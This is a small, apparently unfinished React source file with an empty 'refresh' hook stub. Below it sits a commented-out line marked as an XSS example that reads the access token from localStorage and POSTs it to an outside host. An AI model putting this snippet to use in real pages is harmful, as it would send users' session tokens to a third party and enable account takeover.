import { useContext } from "react";
import { Context } from "../pages/Root";

export default function refresh(){
    const { customFetch } = useContext(Context);

    
}



//!XSS
// fetch("https://google.com", {
//   method: "POST",
//   body: JSON.stringify({ access: localStorage.getItem("access") }),
// });